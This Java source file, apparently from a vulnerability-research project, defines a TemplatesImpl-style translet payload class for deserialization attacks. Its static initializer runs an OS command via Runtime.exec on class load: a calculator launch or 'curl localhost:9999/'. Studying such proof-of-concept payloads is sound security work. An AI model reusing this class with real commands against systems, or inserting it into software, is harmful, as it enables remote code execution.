package org.javaweb.vuln;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class TestAbstractTranslet extends AbstractTranslet implements Runnable {

	private static String command = "open -a Calculator.app";

	static {
		String osName = System.getProperty("os.name");

		if (osName.startsWith("Windows")) {
			command = "calc 12345678901234567";
		} else if (osName.startsWith("Linux")) {
			command = "curl localhost:9999/";
		}

		new Thread(new TestAbstractTranslet()).start();
	}

	@Override
	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

	}

	@Override
	public void transform(DOM document, DTMAxisIterator it, SerializationHandler handler) throws TransletException {

	}

	@Override
	public void run() {
		try {
			Runtime.getRuntime().exec(command);
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
	}

}